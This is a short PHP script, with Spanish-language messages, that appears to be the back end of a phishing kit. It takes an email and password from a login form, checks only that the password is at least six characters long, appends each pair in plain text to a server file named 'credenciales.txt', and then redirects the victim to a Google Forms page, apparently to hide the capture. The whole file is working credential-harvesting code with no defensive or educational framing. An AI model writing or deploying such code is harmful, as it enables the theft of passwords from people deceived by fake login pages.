<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    if (strlen($password) < 6) {
        echo "<h2>La contraseña debe tener al menos 6 caracteres.</h2>";
        echo "<p>Por favor vuelve a ingresarla.</p>";
        echo "<p><a href=\"index.html\">Volver</a></p>";
        exit();
    }

    $credentials = sprintf("%s,%s\n", $email, $password);
    $filePath = __DIR__ . '/credenciales.txt';
    $saved = file_put_contents($filePath, $credentials, FILE_APPEND | LOCK_EX);

    if ($saved === false) {
        echo "<h2>Error al guardar en el servidor</h2>";
        exit();
    }

    header("Location: https://forms.gle/qX13QMHbrFvLBL1E6");
    exit();
} else {
    header("Location: index.html");
    exit();
}
?>